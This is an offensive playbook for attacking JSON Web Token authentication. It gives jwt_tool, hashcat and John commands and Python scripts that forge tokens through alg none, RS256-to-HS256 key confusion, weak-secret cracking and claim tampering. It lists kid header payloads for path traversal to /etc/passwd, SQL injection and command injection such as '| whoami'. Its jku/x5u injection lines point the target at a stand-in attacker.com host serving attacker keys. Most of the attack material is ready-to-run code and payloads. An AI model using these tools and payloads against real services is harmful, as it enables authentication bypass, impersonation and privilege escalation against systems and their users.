# JWT Attacks Playbook

## Indicators

Signs this vulnerability may be present:
- Authorization header contains `Bearer` token with three Base64-encoded sections separated by dots
- Cookies named `token`, `jwt`, `access_token`, `id_token`, or `auth`
- Application uses stateless authentication without server-side session storage
- Token decoded reveals `alg` field in header (HS256, RS256, ES256, none)
- API returns 401/403 with messages about token expiration or signature verification
- Mobile or SPA application with API backend
- OAuth2/OpenID Connect implementation present
- Token contains claims like `iss`, `sub`, `aud`, `exp`, `iat`, `jti`

## JWT Structure

```
Header.Payload.Signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

| Part | Purpose | Example Decoded |
|------|---------|-----------------|
| Header | Algorithm and token type | `{"alg":"HS256","typ":"JWT"}` |
| Payload | Claims (user data, expiration) | `{"sub":"1234567890","name":"John Doe","iat":1516239022}` |
| Signature | Integrity verification | HMAC-SHA256(base64url(header) + "." + base64url(payload), secret) |

## Tools

### jwt_tool

```bash
# Decode and display token contents
jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po

# Full scan - test all vulnerabilities automatically
jwt_tool -t http://target.com/api/protected -rh "Authorization: Bearer <token>" -M at

# Algorithm none attack
jwt_tool <token> -X a

# Null signature attack
jwt_tool <token> -X n

# Key confusion attack (RS256 to HS256) - requires public key
jwt_tool <token> -X k -pk public_key.pem

# Brute force weak secret
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt

# Inject custom claim value
jwt_tool <token> -I -pc "username" -pv "admin"

# Tamper with multiple claims
jwt_tool <token> -T -S hs256 -p "secret123"

# Kid injection - path traversal
jwt_tool <token> -I -hc "kid" -hv "../../dev/null"
jwt_tool <token> -I -hc "kid" -hv "../../etc/passwd"

# Kid injection - SQL injection
jwt_tool <token> -I -hc "kid" -hv "' UNION SELECT 'secret'--"

# jku injection - specify attacker's JWKS URL
jwt_tool <token> -X s -ju "http://attacker.com/jwks.json"

# x5u injection - specify attacker's X509 certificate URL
jwt_tool <token> -X s -x5u "http://attacker.com/cert.pem"

# Inject custom header claim
jwt_tool <token> -I -hc "jku" -hv "http://attacker.com/jwks.json"

# Sign with known secret
jwt_tool <token> -S hs256 -p "secret"

# Sign with RSA private key
jwt_tool <token> -S rs256 -pr private_key.pem

# Export forged token for manual testing
jwt_tool <token> -X a -o forged_token.txt
```

### Hashcat JWT Cracking

```bash
# Crack HS256 JWT secret
# Mode 16500 = JWT (JSON Web Token)
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# With rules for mutation
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force short secrets
hashcat -m 16500 jwt.txt -a 3 ?a?a?a?a?a?a?a?a

# Save JWT to file first (full token)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U" > jwt.txt

# Show cracked secret
hashcat -m 16500 jwt.txt --show
```

### John the Ripper JWT Cracking

```bash
# Convert JWT to john format (if needed)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U" > jwt.txt

# Crack with wordlist
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Show cracked password
john jwt.txt --show --format=HMAC-SHA256
```

### Manual Testing with curl

```bash
# Decode JWT (without verification)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d 2>/dev/null

# Test with original token
curl -H "Authorization: Bearer <original_token>" http://target.com/api/user

# Test with modified token (algorithm none)
curl -H "Authorization: Bearer <forged_token>" http://target.com/api/user

# Test without signature
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9." http://target.com/api/user

# Test expired token handling
curl -H "Authorization: Bearer <expired_token>" http://target.com/api/user
```

### Python JWT Manipulation

```python
#!/usr/bin/env python3
import jwt
import base64
import json
import hmac
import hashlib

# Decode without verification
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
parts = token.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
print(f"Header: {header}")
print(f"Payload: {payload}")

# Algorithm none attack
def alg_none_attack(payload_data):
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip('=')
    return f"{header_b64}.{payload_b64}."

forged = alg_none_attack({"sub": "admin", "role": "administrator"})
print(f"Forged token: {forged}")

# Sign with known secret
secret = "secret123"
forged_token = jwt.encode({"sub": "admin", "role": "administrator"}, secret, algorithm="HS256")
print(f"Signed token: {forged_token}")

# Key confusion attack (RS256 -> HS256)
# Use the public key as the HMAC secret
with open('public_key.pem', 'r') as f:
    public_key = f.read()

# PyJWT >= 2.4.0 requires options to bypass algorithm check
forged = jwt.encode(
    {"sub": "admin", "role": "administrator"},
    public_key,
    algorithm="HS256"
)
print(f"Key confusion token: {forged}")

# Brute force weak secret
def brute_force_jwt(token, wordlist_path):
    with open(wordlist_path, 'r', errors='ignore') as f:
        for word in f:
            secret = word.strip()
            try:
                jwt.decode(token, secret, algorithms=["HS256"])
                print(f"[+] Found secret: {secret}")
                return secret
            except jwt.InvalidSignatureError:
                continue
    return None

# Test for algorithm confusion vulnerability
def test_alg_confusion(token, public_key_path):
    import requests

    with open(public_key_path, 'r') as f:
        public_key = f.read()

    # Decode original payload
    parts = token.split('.')
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

    # Create token signed with public key as HMAC secret
    forged = jwt.encode(payload, public_key, algorithm="HS256")
    return forged
```

### Weak Secret Wordlists

```bash
# Common locations for JWT secret wordlists
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt

# JWT-specific secrets
/usr/share/seclists/Passwords/scraped-JWT-secrets.txt

# Create custom JWT secret list
cat << 'EOF' > jwt_secrets.txt
secret
secretkey
secret123
password
password123
supersecret
mysecret
jwt_secret
jwtkey
your-256-bit-secret
your-secret-key
changeme
admin
key
hmackey
signingkey
private_key
auth_secret
EOF
```

## Techniques

### 1. Algorithm None Attack

Exploits libraries that accept `"alg": "none"` in the header, bypassing signature verification entirely.

```bash
# Using jwt_tool
jwt_tool <token> -X a

# Manual creation
# Header: {"alg": "none", "typ": "JWT"}
# Payload: {"sub": "admin", "role": "administrator"}
# No signature needed
```

```python
import base64
import json

def create_none_token(payload):
    header = {"alg": "none", "typ": "JWT"}
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    return f"{h}.{p}."

# Test variations
tokens = [
    create_none_token({"sub": "admin"}),           # Standard none
]

# Also test these header variations
alg_none_variants = [
    {"alg": "none"},
    {"alg": "None"},
    {"alg": "NONE"},
    {"alg": "nOnE"},
    {"alg": "none", "typ": "JWT"},
]
```

### 2. Algorithm Confusion (RS256 to HS256)

Exploits applications that verify RS256 tokens using the public key but accept HS256 algorithm. The public key becomes the HMAC secret.

```bash
# Extract public key from server (if exposed)
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > public_key.pem

# Or fetch from JWKS endpoint
curl -s https://target.com/.well-known/jwks.json | python3 -c "
import json, sys
from jwcrypto import jwk
data = json.load(sys.stdin)
key = jwk.JWK(**data['keys'][0])
print(key.export_to_pem())
" > public_key.pem

# Use jwt_tool for key confusion attack
jwt_tool <token> -X k -pk public_key.pem
```

```python
import jwt
import json

# Read the public key
with open('public_key.pem', 'r') as f:
    public_key = f.read()

# Original token payload (decoded)
payload = {
    "sub": "admin",
    "role": "administrator",
    "exp": 9999999999
}

# Sign with public key as HMAC secret
# Note: Modern PyJWT may block this - use pyjwt < 2.4.0 or jwt library
forged_token = jwt.encode(payload, public_key, algorithm="HS256")
print(forged_token)
```

### 3. Weak Secret Cracking

Many applications use guessable secrets like "secret", company name, or default values.

```bash
# Hashcat - fastest for GPU cracking
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --force

# John the Ripper
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# jwt_tool built-in cracking
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt

# Python script for custom cracking
python3 << 'EOF'
import jwt
import sys

token = sys.argv[1] if len(sys.argv) > 1 else input("Token: ")
wordlist = sys.argv[2] if len(sys.argv) > 2 else "/usr/share/wordlists/rockyou.txt"

with open(wordlist, 'r', errors='ignore') as f:
    for i, word in enumerate(f):
        secret = word.strip()
        try:
            jwt.decode(token, secret, algorithms=["HS256", "HS384", "HS512"])
            print(f"[+] Secret found: {secret}")
            sys.exit(0)
        except:
            pass
        if i % 100000 == 0:
            print(f"Tried {i} passwords...", file=sys.stderr)
print("[-] Secret not found")
EOF
```

### 4. Key ID (kid) Injection

The `kid` header parameter specifies which key to use for verification. If not properly sanitized, it can lead to path traversal, SQL injection, or command injection.

```bash
# Path traversal to /dev/null (empty file = empty key)
jwt_tool <token> -I -hc "kid" -hv "../../../../../../dev/null"

# Path traversal to known file content
jwt_tool <token> -I -hc "kid" -hv "../../../../../../etc/hostname"

# SQL injection in kid (if kid is used in SQL query)
jwt_tool <token> -I -hc "kid" -hv "' UNION SELECT 'ATTACKER_CONTROLLED_SECRET'--"

# Command injection in kid
jwt_tool <token> -I -hc "kid" -hv "| whoami"
jwt_tool <token> -I -hc "kid" -hv "\`whoami\`"
```

```python
import jwt
import base64
import json

def create_kid_injection_token(payload, kid_value, secret=""):
    """Create token with injected kid parameter"""
    header = {
        "alg": "HS256",
        "typ": "JWT",
        "kid": kid_value
    }

    # For path traversal to /dev/null, sign with empty secret
    token = jwt.encode(payload, secret, algorithm="HS256", headers={"kid": kid_value})
    return token

# Path traversal payloads
kid_payloads = [
    "../../../../../../dev/null",                      # Empty secret
    "../../../../../../etc/hostname",                  # Known file content
    "../../../../../../../proc/sys/kernel/hostname",   # Alternative
    "/dev/null",                                       # Absolute path
]

# SQL injection payloads (if kid used in SQL query)
kid_sql_payloads = [
    "' UNION SELECT 'mysecret'--",
    "\" UNION SELECT 'mysecret'--",
    "1' OR '1'='1",
    "1 UNION SELECT password FROM secrets--",
]

payload = {"sub": "admin", "role": "administrator"}
for kid in kid_payloads:
    token = create_kid_injection_token(payload, kid, secret="")
    print(f"kid={kid[:30]}... -> {token[:50]}...")
```

### 5. JKU/X5U Header Injection

The `jku` (JWK Set URL) and `x5u` (X.509 URL) headers specify where to fetch the signing key. Injecting an attacker-controlled URL allows signing with your own key.

```bash
# Generate attacker's RSA key pair
openssl genrsa -out attacker_private.pem 2048
openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem

# Create JWKS file for attacker server
python3 << 'EOF' > jwks.json
from jwcrypto import jwk
import json

with open('attacker_public.pem', 'rb') as f:
    key = jwk.JWK.from_pem(f.read())

jwks = {"keys": [json.loads(key.export())]}
print(json.dumps(jwks, indent=2))
EOF

# Host JWKS on attacker server
python3 -m http.server 8080 &

# Create forged token with jku pointing to attacker
jwt_tool <token> -X s -ju "http://attacker.com:8080/jwks.json"

# Same attack with x5u header
jwt_tool <token> -X s -x5u "http://attacker.com:8080/cert.pem"
```

```python
import jwt
import json
from jwcrypto import jwk
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

# Generate RSA key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)

# Export keys
private_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)

public_pem = private_key.public_key().public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# Create JWKS
key = jwk.JWK.from_pem(public_pem)
jwks = {"keys": [json.loads(key.export())]}
print("JWKS to host:")
print(json.dumps(jwks, indent=2))

# Create forged token
payload = {"sub": "admin", "role": "administrator"}
headers = {"jku": "http://attacker.com/jwks.json"}
forged = jwt.encode(payload, private_pem, algorithm="RS256", headers=headers)
print(f"\nForged token: {forged}")
```

### 6. Claim Manipulation

Modify payload claims to escalate privileges or impersonate users.

```bash
# Change user role
jwt_tool <token> -I -pc "role" -pv "admin"
jwt_tool <token> -I -pc "is_admin" -pv "true"

# Change user ID
jwt_tool <token> -I -pc "sub" -pv "1"
jwt_tool <token> -I -pc "user_id" -pv "administrator"

# Extend expiration
jwt_tool <token> -I -pc "exp" -pv "9999999999"

# Multiple claim modifications
jwt_tool <token> -I -pc "role" -pv "admin" -pc "sub" -pv "1" -S hs256 -p "known_secret"
```

```python
import jwt
import time

# Decode original token
original_token = "<token>"
# If secret is known:
secret = "known_secret"
payload = jwt.decode(original_token, secret, algorithms=["HS256"])

# Modify claims
payload["role"] = "administrator"
payload["is_admin"] = True
payload["sub"] = "admin"
payload["exp"] = int(time.time()) + 86400 * 365  # 1 year

# Re-sign with known secret
forged = jwt.encode(payload, secret, algorithm="HS256")
print(forged)
```

## Bypass Techniques

### Signature Stripping

```python
# Remove signature entirely
def strip_signature(token):
    parts = token.split('.')
    return f"{parts[0]}.{parts[1]}."

# Empty signature
def empty_signature(token):
    parts = token.split('.')
    return f"{parts[0]}.{parts[1]}.AA=="
```

### Algorithm Variants

```python
# Test various none algorithm representations
none_variants = [
    "none", "None", "NONE", "nOnE",
    "none ", " none", "none\x00",
    "None\x00", "NONE\x00"
]

# Test case variations for HS256
hs_variants = [
    "HS256", "hs256", "Hs256", "hS256"
]
```

### Signature Validation Bypass

```bash
# Test if signature is validated at all
# Change last character of signature
original="eyJ...signature"
modified="${original::-1}X"  # Change last char
curl -H "Authorization: Bearer $modified" http://target.com/api

# Test with completely random signature
random_sig=$(openssl rand -base64 32 | tr -d '=')
curl -H "Authorization: Bearer ${header}.${payload}.${random_sig}" http://target.com/api
```

### Token Confusion

```python
# Test if different token types are accepted
# ID token vs Access token confusion
# Refresh token used as access token

# Test audience claim bypass
payloads = [
    {"aud": "different-app"},
    {"aud": ["legitimate-app", "attacker-app"]},
    {"aud": "*"},
]
```

## Common Vulnerable Libraries

| Library | Vulnerability | Affected Versions |
|---------|--------------|-------------------|
| PyJWT (Python) | Algorithm confusion | < 1.5.0 |
| jsonwebtoken (Node.js) | Algorithm none | < 4.2.2 |
| jose2go (Go) | Algorithm none | < 1.3.0 |
| jsjws (JavaScript) | Algorithm confusion | All versions |
| JWT (Ruby) | Algorithm none | < 1.5.2 |
| nimbus-jose-jwt (Java) | Weak default | < 7.9 |

## JWKS Endpoint Discovery

```bash
# Common JWKS endpoints
curl https://target.com/.well-known/jwks.json
curl https://target.com/.well-known/openid-configuration | jq .jwks_uri
curl https://target.com/oauth/jwks
curl https://target.com/auth/keys
curl https://target.com/oauth2/v1/keys
curl https://target.com/.well-known/openid-configuration

# Auth0 format
curl https://target.auth0.com/.well-known/jwks.json

# Azure AD
curl https://login.microsoftonline.com/{tenant}/discovery/v2.0/keys

# Google
curl https://www.googleapis.com/oauth2/v3/certs
```

## Success Indicators

- Token accepted without signature or with modified signature
- Algorithm none attack allows arbitrary payload
- Weak secret successfully cracked and forged tokens accepted
- RS256 to HS256 confusion allows signing with public key
- KID injection achieves path traversal, SQLi, or command injection
- JKU/X5U injection makes server fetch attacker's keys
- Modified claims (role, user ID) grant elevated access
- Expired tokens still accepted after manipulation
- Token from one application accepted by another (audience bypass)
- Access to admin endpoints or other users' data confirmed
